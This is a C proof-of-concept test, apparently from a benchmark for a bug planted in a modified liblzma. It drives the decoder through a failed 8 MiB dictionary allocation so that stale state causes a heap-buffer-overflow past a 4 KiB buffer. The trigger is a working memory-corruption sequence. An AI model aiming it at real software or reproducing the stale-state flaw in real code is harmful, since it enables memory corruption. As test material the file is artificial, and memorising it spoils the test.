// PoC: stale dictionary state after a failed LZ decoder
// reinitialization in liblzma.
//
// Uses only the public API:
//   - lzma_alone_decoder() to (re)initialize an LZMA-Alone decoder
//   - lzma_code() to decode in-contract .lzma input
//   - a custom lzma_allocator that refuses large allocations
//     (allocation failure is a documented condition: the library
//     must report LZMA_MEM_ERROR and remain usable)
//
// Sequence on one lzma_stream:
//   1. Decode a .lzma stream whose header requests a 4 KiB
//      dictionary. The dictionary buffer gets allocated.
//   2. Reinitialize the decoder and feed a .lzma stream whose
//      header requests an 8 MiB dictionary. The allocator refuses
//      the allocation, so lzma_code() must return LZMA_MEM_ERROR.
//   3. Reinitialize the decoder and feed the 8 MiB stream again.
//      A correct library attempts the allocation once more and
//      fails cleanly with LZMA_MEM_ERROR again.
//
// On the modified tree, step 3 reuses the stale dictionary state
// left behind by step 2: the recorded dictionary size already
// matches the new request, so no new buffer is allocated and the
// decoder writes the decompressed data past the end of the old
// 4 KiB heap buffer (heap-buffer-overflow caught by
// AddressSanitizer).

#include <lzma.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define MEMLIMIT (64U << 20)
#define TOO_BIG_ALLOC (1U << 20)

// Valid LZMA-Alone stream (dictionary size 4096, unknown
// uncompressed size, end marker present) expanding to 16000 bytes.
static const uint8_t small_dict_file[] = {
	0x5d, 0x00, 0x10, 0x00, 0x00, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x2a, 0x1a,
	0x08, 0xa2, 0x03, 0x25, 0x66, 0xf1, 0x4b, 0x78,
	0xc5, 0xa2, 0x05, 0xff, 0x2e, 0xe6, 0xd9, 0xd2,
	0x20, 0x1a, 0xad, 0x34, 0xf8, 0xe2, 0x1d, 0xe8,
	0x41, 0x36, 0xfa, 0xdc, 0x06, 0x69, 0xbb, 0x3c,
	0xe4, 0x10, 0x34, 0x27, 0x09, 0xeb, 0xb3, 0x66,
	0xe3, 0xed, 0x37, 0x98, 0xed, 0x92, 0xad, 0xd5,
	0x27, 0x45, 0x08, 0x30, 0x5e, 0x5d, 0x9a, 0x3c,
	0x41, 0xc4, 0x18, 0x4a, 0x53, 0xf6, 0x6a, 0xd9,
	0xfd, 0xd0, 0x04, 0xac, 0x83, 0x78, 0x9d, 0x17,
	0x17, 0x82, 0x3e, 0x6c, 0x38, 0xb1, 0xde, 0xcc,
	0x3f, 0xba, 0xe5, 0x03, 0xb1, 0x5b, 0x44, 0xb8,
	0x9d, 0x9c, 0x3d, 0x05, 0xcd, 0x47, 0x69, 0x6e,
	0x56, 0x5f, 0xfd, 0xda, 0x64, 0x00
};

static void *
my_alloc(void *opaque, size_t nmemb, size_t size)
{
	(void)opaque;

	if (nmemb != 0 && size > SIZE_MAX / nmemb)
		return NULL;

	if (nmemb * size >= TOO_BIG_ALLOC)
		return NULL;

	return calloc(nmemb, size);
}

static void
my_free(void *opaque, void *ptr)
{
	(void)opaque;
	free(ptr);
	return;
}

static lzma_allocator my_allocator = { &my_alloc, &my_free, NULL };

static lzma_ret
run_file(lzma_stream *strm, const uint8_t *data, size_t size)
{
	static uint8_t out[65536];

	if (lzma_alone_decoder(strm, MEMLIMIT) != LZMA_OK) {
		fprintf(stderr, "lzma_alone_decoder failed\n");
		lzma_end(strm);
		exit(2);
	}

	strm->next_in = data;
	strm->avail_in = size;
	strm->next_out = out;
	strm->avail_out = sizeof(out);

	return lzma_code(strm, LZMA_FINISH);
}

int
main(void)
{
	// Same stream but with the header's dictionary size field
	// (bytes 1..4, little endian) set to 8 MiB.
	uint8_t big_dict_file[sizeof(small_dict_file)];
	memcpy(big_dict_file, small_dict_file, sizeof(big_dict_file));
	big_dict_file[1] = 0x00;
	big_dict_file[2] = 0x00;
	big_dict_file[3] = 0x80;
	big_dict_file[4] = 0x00;

	lzma_stream strm = LZMA_STREAM_INIT;
	strm.allocator = &my_allocator;

	// Step 1: decode the 4 KiB-dictionary stream. The decoder
	// initializes and allocates the dictionary buffer.
	lzma_ret ret = run_file(&strm, small_dict_file,
			sizeof(small_dict_file));
	if (ret != LZMA_STREAM_END && ret != LZMA_OK) {
		fprintf(stderr, "step 1: unexpected ret %d\n", (int)ret);
		lzma_end(&strm);
		return 2;
	}

	// Step 2: 8 MiB dictionary; the allocation must fail cleanly.
	ret = run_file(&strm, big_dict_file, sizeof(big_dict_file));
	if (ret != LZMA_MEM_ERROR) {
		fprintf(stderr, "step 2: unexpected ret %d\n", (int)ret);
		lzma_end(&strm);
		return 2;
	}

	// Step 3: the 8 MiB-dictionary stream again. On a correct
	// library the allocation is attempted again and fails cleanly
	// with LZMA_MEM_ERROR. On the modified tree the stale
	// dictionary state is reused and the decoder writes past the
	// old 4 KiB dictionary buffer here.
	ret = run_file(&strm, big_dict_file, sizeof(big_dict_file));
	if (ret != LZMA_MEM_ERROR) {
		fprintf(stderr, "step 3: unexpected ret %d\n", (int)ret);
		lzma_end(&strm);
		return 2;
	}

	lzma_end(&strm);
	printf("OK\n");
	return 0;
}
